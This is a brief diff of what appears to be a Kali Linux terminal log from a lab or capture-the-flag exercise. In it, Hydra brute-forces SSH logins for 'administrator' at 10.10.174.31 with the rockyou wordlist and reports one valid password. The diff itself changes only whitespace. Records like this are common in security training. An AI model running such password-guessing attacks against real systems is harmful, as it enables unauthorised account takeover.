@@ -1,3 +1,5 @@
+
+
 ┌──(doc730㉿kali)-[~]
 └─$ hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt -f -v 10.10.174.31 ssh
 
@@ -16,7 +18,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-21 22:50:
 1f 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-21 22:52:17
                                                                                     
-                                                                                    ______________________________________________________________________________________________
+______________________________________________________________________________________________
 
 
 
